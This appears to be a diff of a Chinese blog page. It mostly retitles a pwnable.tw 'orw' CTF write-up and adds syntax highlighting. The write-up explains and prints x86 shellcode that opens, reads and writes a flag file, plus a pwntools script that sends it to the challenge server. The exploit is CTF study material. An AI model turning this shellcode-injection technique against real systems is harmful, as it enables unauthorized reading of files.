@@ -106,13 +106,13 @@
 <meta name="description" content="pwnable.tw orw writeup shellcode的编写">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.tw orw writeup">
+<meta property="og:title" content="CTF|pwnable.tw orw writeup">
 <meta property="og:url" content="https://yuuoniy.github.io/2018/03/14/pwnable-tw-orw-writeup/index.html">
 <meta property="og:site_name" content="尿尿">
 <meta property="og:description" content="pwnable.tw orw writeup shellcode的编写">
-<meta property="og:updated_time" content="2018-03-14T05:16:29.319Z">
+<meta property="og:updated_time" content="2018-09-10T07:06:40.482Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.tw orw writeup">
+<meta name="twitter:title" content="CTF|pwnable.tw orw writeup">
 <meta name="twitter:description" content="pwnable.tw orw writeup shellcode的编写">
 
 
@@ -147,7 +147,7 @@
 
 
 
-  <title> pwnable.tw orw writeup | 尿尿 </title>
+  <title> CTF|pwnable.tw orw writeup | 尿尿 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="en">
@@ -335,7 +335,7 @@
             
             
               
-                pwnable.tw orw writeup
+                CTF|pwnable.tw orw writeup
               
             
           </h1>
@@ -420,10 +420,11 @@
 
       
         <p>pwnable.tw orw writeup shellcode的编写<br><a id="more"></a><br>呀真的好久没有写博客了，最近在做一些题，都在看别人的题解，做过也忘了，接下来希望好好记录一下，帮助自己理解。</p>
-<p>这道题是有关shellcode的编写，这部分我之前也没学习过，都是使用机器生成的。就…结合别人的writeup 说一下自己的理解吧。</p>
-<p>高级语言形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">char *fn = &quot;/home/orw/flag&quot;;</div><div class="line">sys_open(fn,0,0)</div><div class="line">sys_read(3,fn,0x30)</div><div class="line">sys_write(1,fn,0x30)</div></pre></td></tr></table></figure></p>
-<p>查看 <a href="http://syscalls.kernelgrok.com/" target="_blank" rel="external">linux 系统调用</a> 获得各个函数的调用号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">首先是第一部分 sys_open</div><div class="line">xor ecx,ecx ;清空ecx寄存器</div><div class="line">mov eax,0x5;查看以上资料知道 sys_open 对应0x5</div><div class="line">push ecx ;把一个空值压入栈中(这里不是很理解)</div><div class="line">push 0x67616c66;galf(flag) 接下来就是把字符串作为参数压入栈中 数字就是字符的ASCII码十六进制值</div><div class="line">push 0x2f77726f; /wro (orw/)</div><div class="line">push 0x2f656d6f; /emo (ome/)</div><div class="line">push 0x682f2f2f; h/// (///h)</div><div class="line">mov ebx,esp;把内容移到ebx</div><div class="line">xor edx,edx;清空 edx</div><div class="line">int 0x80;中断 执行syscall</div><div class="line"></div><div class="line">第二部分是sys_read</div><div class="line">mov eax,0x3;sys_read</div><div class="line">mov ecx,ebx;flag文件中的内容</div><div class="line">mov ebx,0x3;文件描述符</div><div class="line">mov dl,0x30;用于中断(??)</div><div class="line">int 0x80;中断 执行syscall</div><div class="line"></div><div class="line">第三部分是sys_write</div><div class="line">mov eax,0x4;sys_write</div><div class="line">mov bl,0x1;用于中断</div><div class="line">int 0x80</div></pre></td></tr></table></figure></p>
-<p>最后的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">io = remote(&apos;chall.pwnable.tw&apos;,10001)</div><div class="line">shellcode = &apos;&apos;</div><div class="line">shellcode+=asm(&apos;xor ecx,ecx;mov eax,0x5;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp;&apos;)</div><div class="line">shellcode +=asm(&apos;xor edx,edx;int 0x80;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;&apos;)</div><div class="line">shellcode+=asm(&apos;mov eax,0x4; mov bl,0x1;int 0x80;&apos;)</div><div class="line">io.recvuntil(&apos;:&apos;)</div><div class="line">io.send(shellcode)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<p>这道题是有关<code>shellcode</code>的编写，这部分我之前也没学习过，都是使用机器生成的。就…结合别人的writeup 说一下自己的理解吧。</p>
+<p>高级语言形式<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *fn = <span class="string">"/home/orw/flag"</span>;</div><div class="line">sys_open(fn,<span class="number">0</span>,<span class="number">0</span>)</div><div class="line">sys_read(<span class="number">3</span>,fn,<span class="number">0x30</span>)</div><div class="line">sys_write(<span class="number">1</span>,fn,<span class="number">0x30</span>)</div></pre></td></tr></table></figure></p>
+<p>查看 <a href="http://syscalls.kernelgrok.com/" target="_blank" rel="external">linux 系统调用</a> 获得各个函数的调用号</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">首先是第一部分 sys_open</div><div class="line"><span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span> <span class="comment">;清空ecx寄存器</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x5</span><span class="comment">;查看以上资料知道 sys_open 对应0x5</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ecx</span> <span class="comment">;把一个空值压入栈中(这里不是很理解)</span></div><div class="line"><span class="keyword">push</span> <span class="number">0x67616c66</span><span class="comment">;galf(flag) 接下来就是把字符串作为参数压入栈中 数字就是字符的ASCII码十六进制值</span></div><div class="line"><span class="keyword">push</span> <span class="number">0x2f77726f</span><span class="comment">; /wro (orw/)</span></div><div class="line"><span class="keyword">push</span> <span class="number">0x2f656d6f</span><span class="comment">; /emo (ome/)</span></div><div class="line"><span class="keyword">push</span> <span class="number">0x682f2f2f</span><span class="comment">; h/// (///h)</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">esp</span><span class="comment">;把内容移到ebx</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">edx</span>,<span class="built_in">edx</span><span class="comment">;清空 edx</span></div><div class="line"><span class="keyword">int</span> <span class="number">0x80</span><span class="comment">;中断 执行syscall</span></div><div class="line"></div><div class="line">第二部分是sys_read</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x3</span><span class="comment">;sys_read</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">ebx</span><span class="comment">;flag文件中的内容</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0x3</span><span class="comment">;文件描述符</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>,<span class="number">0x30</span><span class="comment">;用于中断(??)</span></div><div class="line"><span class="keyword">int</span> <span class="number">0x80</span><span class="comment">;中断 执行syscall</span></div><div class="line"></div><div class="line">第三部分是sys_write</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x4</span><span class="comment">;sys_write</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bl</span>,<span class="number">0x1</span><span class="comment">;用于中断</span></div><div class="line"><span class="keyword">int</span> <span class="number">0x80</span></div></pre></td></tr></table></figure>
+<p>最后的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">io = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10001</span>)</div><div class="line">shellcode = <span class="string">''</span></div><div class="line">shellcode+=asm(<span class="string">'xor ecx,ecx;mov eax,0x5;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx,esp;'</span>)</div><div class="line">shellcode +=asm(<span class="string">'xor edx,edx;int 0x80;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;'</span>)</div><div class="line">shellcode+=asm(<span class="string">'mov eax,0x4; mov bl,0x1;int 0x80;'</span>)</div><div class="line">io.recvuntil(<span class="string">':'</span>)</div><div class="line">io.send(shellcode)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -795,7 +796,7 @@
         var disqus_config = function () {
           this.page.url = 'https://yuuoniy.github.io/2018/03/14/pwnable-tw-orw-writeup/';
           this.page.identifier = '2018/03/14/pwnable-tw-orw-writeup/';
-          this.page.title = 'pwnable.tw orw writeup';
+          this.page.title = 'CTF|pwnable.tw orw writeup';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://yuuoniy.disqus.com/embed.js';
